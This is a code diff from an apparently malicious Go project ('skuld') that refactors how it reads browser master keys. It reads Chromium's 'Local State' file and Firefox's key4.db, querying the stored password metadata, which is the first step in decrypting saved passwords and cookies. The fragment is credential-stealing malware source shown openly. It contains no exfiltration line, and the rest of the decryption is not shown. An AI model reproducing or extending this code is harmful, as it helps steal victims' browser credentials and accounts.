@@ -2,23 +2,18 @@ package browsers
 
 import (
 	"bytes"
-	"database/sql"
 	"encoding/base64"
 	"encoding/json"
 	"errors"
-	"fmt"
 	"os"
+	"path/filepath"
 
 	"github.com/hackirby/skuld/utils/fileutil"
 	_ "modernc.org/sqlite"
 )
 
 func (c *Chromium) GetMasterKey(path string) error {
-	err := fileutil.CopyFile(fmt.Sprintf("%s\\Local State", path), "masterkey_db")
-	if err != nil {
-		return err
-	}
-	b, err := fileutil.ReadFile("masterkey_db")
+	b, err := fileutil.ReadFile(filepath.Join(path, "Local State"))
 	if err != nil {
 		return err
 	}
@@ -49,17 +44,12 @@ func (c *Chromium) GetMasterKey(path string) error {
 
 func (g *Gecko) GetMasterKey(path string) error {
 	var globalSalt, metaBytes, nssA11, nssA102, key []byte
-	err := fileutil.CopyFile(fmt.Sprintf("%s\\key4.db", path), "masterkey_db")
-	if err != nil {
-		return err
-	}
 
-	keyDB, err := sql.Open("sqlite", "masterkey_db")
+	keyDB, err := GetDBConnection(filepath.Join(path, "key4.db"))
+
 	if err != nil {
 		return err
 	}
-	defer os.Remove("masterkey_db")
-	defer keyDB.Close()
 
 	if err = keyDB.QueryRow(`SELECT item1, item2 FROM metaData WHERE id = 'password'`).Scan(&globalSalt, &metaBytes); err != nil {
 		return err
